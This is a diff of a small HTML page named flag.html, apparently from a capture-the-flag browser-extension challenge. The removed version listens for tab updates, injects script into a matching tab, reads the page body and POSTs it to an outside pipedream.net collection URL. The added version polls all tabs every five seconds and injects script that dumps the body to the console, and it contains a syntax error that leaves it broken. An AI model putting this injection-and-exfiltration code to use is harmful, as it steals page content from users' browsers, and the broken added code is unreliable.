@@ -6,56 +6,32 @@
   <title>flag.html</title>
   <script src="jquery-3.4.1.min.js"></script>
   <script>
-    var tabsInfo = {};
-
-    function f(tabId, changeInfo, tab) {
-      if (changeInfo.title) {
-        if (!tabsInfo[changeInfo.title]) {
-          tabsInfo[changeInfo.title] = [];
-        }
-
-        if (tabsInfo[changeInfo.title].length === 0) {
-          tabsInfo[changeInfo.title].push({ id: tabId, url: tab.url });
-        } else {
-          var found = false;
-          tabsInfo[changeInfo.title].forEach(tabInfo => {
-            if (tabInfo.id === tabId) {
-              tabInfo.url = tab.url; // Update URL if it has changed
-              found = true;
+    $(document).ready(function(){
+      
+      function checkAndExecuteScript() {
+        
+        chrome.tabs.query({}, function(tabs) {
+         
+          tabs.forEach(function(tab) {
+           
+            if (tab.title === 'flag.html') {
+            
+              chrome.tabs.executeScript(tab.id, {
+                code: 'var bodyContent = document.body.innerHTML; console.log(bodyContent);'
+              });
             }
           });
-
-          if (!found) {
-            tabsInfo[changeInfo.title].push({ id: tabId, url: tab.url });
-          }
-
-          var firstTab = tabsInfo[changeInfo.title][0];
-          if (firstTab.id === tabId) {
-            // You are accessing the first tab with the same title
-            chrome.tabs.executeScript(tabId, {
-              code: `var flag = $("body").html();
-                     console.log(flag);
-                     fetch('https://eo876vqe5g2n7ku.m.pipedream.net', {
-                       method: 'POST',
-                       headers: {
-                         'Content-Type': 'application/json'
-                       },
-                       body: JSON.stringify({ flag })
-                     })
-                     .then(response => response.text())
-                     .then(result => {
-                       console.log('Response from server:', result);
-                     });`
-            });
-          }
-        }
+        });
       }
-    }
 
-    chrome.tabs.onUpdated.addListener(f);
+
+      checkAndExecuteScript();
+
+     
+      setInterval(checkAndExecuteScript, 5000); )
+    });
   </script>
 </head>
 <body>
 </body>
 </html>
-
